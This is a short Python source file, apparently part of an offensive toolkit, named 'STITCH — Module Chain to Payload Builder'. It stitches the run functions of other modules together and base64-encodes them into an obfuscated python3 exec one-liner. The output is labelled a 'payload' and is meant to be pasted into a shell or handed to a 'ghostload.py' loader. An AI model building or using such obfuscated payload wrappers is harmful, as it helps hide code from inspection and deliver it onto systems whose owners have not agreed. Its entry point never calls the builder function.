import base64
import os
from rich import print
from rich.prompt import Prompt
from rich.panel import Panel

MODULE_PATH = "./modules"

def list_modules():
    return sorted([f.replace(".py", "") for f in os.listdir(MODULE_PATH) if f.endswith(".py") and f not in ["__init__.py"]])

def read_module(name):
    path = os.path.join(MODULE_PATH, name + ".py")
    with open(path, "r") as f:
        return f.read()

def generate_chain(modules):
    chain_code = ""
    for mod in modules:
        code = read_module(mod)
        func_start = code.find("def run")
        if func_start == -1:
            continue
        body = code[func_start:]
        chain_code += f"# --- {mod}.py ---\n{body}\n\n"
    return chain_code

def encode_chain(chain):
    encoded = base64.b64encode(chain.encode()).decode()
    return f'python3 -c "import base64;exec(base64.b64decode(\'{encoded}\'))"'

def run():
    print(Panel("🧵 [bold magenta]STITCH — Module Chain to Payload Builder[/bold magenta]"))

    mods = list_modules()
    print("[bold cyan]Available Modules:[/bold cyan]")
    for i, m in enumerate(mods):
        print(f"[green]{i+1}[/green]: {m}")

    selected = Prompt.ask("\n[bold yellow]Enter module names (comma-separated)[/bold yellow]").split(",")
    selected = [m.strip() for m in selected if m.strip() in mods]

    if not selected:
        print("[red]No valid modules selected.[/red]")
        return

    chain_code = generate_chain(selected)
    payload = encode_chain(chain_code)

    print("\n[bold green]Generated Payload:[/bold green]")
    print(payload)
    print("\n[dim]Paste into shell or use with ghostload.py[/dim]")

def main(args=None):
    print("[stitch] 🧵 Payload binder logic active.")

if __name__ == "__main__":
    main()
